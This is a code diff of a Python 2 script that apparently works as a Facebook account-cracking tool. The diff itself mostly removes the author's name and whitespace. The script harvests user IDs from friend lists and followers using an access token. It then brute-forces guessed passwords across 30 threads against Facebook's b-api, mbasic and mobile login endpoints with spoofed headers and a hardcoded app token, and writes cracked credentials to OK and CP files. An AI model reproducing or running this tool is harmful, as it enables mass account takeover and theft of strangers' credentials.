@@ -1,27 +1,27 @@
 # -*- coding: utf-8
-# author by Wahid Baloch
+# author by 
 import os
 try:
 	import requests
 except ImportError:
 	os.system("pip2 install requests")
- 
+
 try:
 	import bs4
 except ImportError:
 	os.system("pip2 install bs4")
- 
+
 import os, sys, re, time, requests, json, random, calendar
 from multiprocessing.pool import ThreadPool
 from bs4 import BeautifulSoup as parser
 from datetime import datetime
 from datetime import date
- 
+
 loop = 0
 id = []
 ok = []
 cp = []
- 
+
 ct = datetime.now()
 n = ct.month
 bulan = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"]
@@ -31,26 +31,26 @@ try:
     nTemp = n - 1
 except ValueError:
     exit()
- 
+
 current = datetime.now()
 ta = current.year
 bu = current.month
 ha = current.day
 op = bulan[nTemp]
- 
- 
+
+
 def  jalan(z):
 	for e in z + '\n':
 		sys.stdout.write(e)
 		sys.stdout.flush()
 		time.sleep(000.05)
- 
+
 my_date = date.today()
 hr = calendar.day_name[my_date.weekday()]
 tBilall = ("%s-%s-%s-%s"%(hr, ha, op, ta))
 tgl = ("%s %s %s"%(ha, op, ta))
 bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
- 
+
 def logo():
 	os.system("clear")
 	print("""\x1b[0;32m█╗    ██╗ █████╗ ██╗  ██╗██╗██████╗                
@@ -82,7 +82,7 @@ def login():
 		except KeyError:
 			os.system("rm -f login.txt")
 			exit("[?] Login Error")
- 
+
 def menu():
 	os.system("clear")
 	global token
@@ -171,7 +171,7 @@ def menu():
 		exit("\n\033[1;97m[\033[1;94m!\033[1;97m] Token Removed")
 	else:
 		menu()
- 
+
 def publik():
 	global token
 	try:
@@ -187,7 +187,7 @@ def publik():
 	except KeyError:
 		exit("\n\033[1;97m[\033[1;94m+\033[1;97m] Account Friend List is Not Public")
 	print("\033[1;97m[\033[1;94m+\033[1;97m] Total id  : \033[0;91m%s\033[0;97m"%(len(id))) 
- 
+
 def follower():
 	global token
 	try:
@@ -203,7 +203,7 @@ def follower():
 	except KeyError:
 		exit("URL Error")
 	print("[?] Total id  : \033[0;91m%s\033[0;97m"%(len(id))) 
- 
+
 def massal():
 	global token
 	try:
@@ -224,7 +224,7 @@ def massal():
 		except KeyError:
 			print("\033[1;97m[\033[1;94m+\033[1;97m] Ids Friend list Is Not Public")
 	print("\033[1;97m[\033[1;94m?\033[1;97m] Total id  : \033[0;91m%s\033[0;97m"%(len(id)))
- 
+
 def method():
 	print("\n\033[1;97m[\033[1;94m?\033[1;97m] Choose Cracking Mathod")
 	print("\033[1;97m[\033[1;94m1\033[1;97m] B-Api\033[1;97m [ \033[1;95mFast \033[1;97m]")
@@ -256,7 +256,7 @@ def method():
 		exit("Program End")
 	else:
 		menu()
- 
+
 def cek_ttl_cp(uid, pw):
 	try:
 		token = open("login.txt", "r").read()
@@ -272,7 +272,7 @@ def cek_ttl_cp(uid, pw):
 		month = (" ")
 		year = (" ")
 	except:pass
- 
+
 def bapi(user):
 	try:
 		ua = open(".ua", "r").read()
@@ -296,7 +296,7 @@ def bapi(user):
 			pw = pw.lower()
 			ses = requests.Session()
 			headers_ = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
-			send = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_)
+			send = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_)
 			if "session_key" in send.text and "EAAA" in send.text:
 				print("\r\033[0;92m[OK] %s|%s|%s\033[0;97m"%(uid, pw, send.json()["access_token"]))
 				ok.append("%s|%s"%(uid, pw))
@@ -309,11 +309,11 @@ def bapi(user):
 				open("CP/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
 				break
 				continue
- 
+
 		loop += 1
 	except:
 		pass
- 
+
 def mbasic(user):
 	try:
 		ua = open(".ua", "r").read()
@@ -361,11 +361,11 @@ def mbasic(user):
 				open("CP/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
 				break
 				continue
- 
+
 		loop += 1
 	except:
 		pass
- 
+
 def mobile(user):
 	try:
 		ua = open(".ua", "r").read()
@@ -413,11 +413,11 @@ def mobile(user):
 				open("CP/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
 				break
 				continue
- 
+
 		loop += 1
 	except:
 		pass
- 
+
 def manual():
 	try:
 		ua = open(".ua", "r").read()
@@ -429,7 +429,7 @@ def manual():
 	if len(asu) =="":
 		exit("[?] Wrong Input")
 	print("[+] Enter 2-4 Passwords For Fast Cracking Speed\n")
- 
+
 	def main(user):
 		global loop, token
 		sys.stdout.write(
@@ -465,14 +465,14 @@ def manual():
 					open("CP/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
 					break
 					continue
- 
+
 			loop += 1
 		except:
 			pass
 	p = ThreadPool(30)
 	p.map(main, id)
 	exit("\n\n # [>Program Close<]")
- 
+
 def setting_ua():
 	print("[1] Change User-Agent")
 	print("[2] Default User-Agent")
@@ -491,16 +491,15 @@ def setting_ua():
 		time.sleep(1)
 		raw_input("\n[•] User-Agent Save Successfully")
 		menu()
- 
+
 def buat_folder():
 	try:os.mkdir("CP")
 	except:pass
 	try:os.mkdir("OK")
 	except:pass
- 
+
 if __name__ == "__main__":
 	os.system("git pull")
 	os.system("touch login.txt")
 	buat_folder()
 	login()
- 
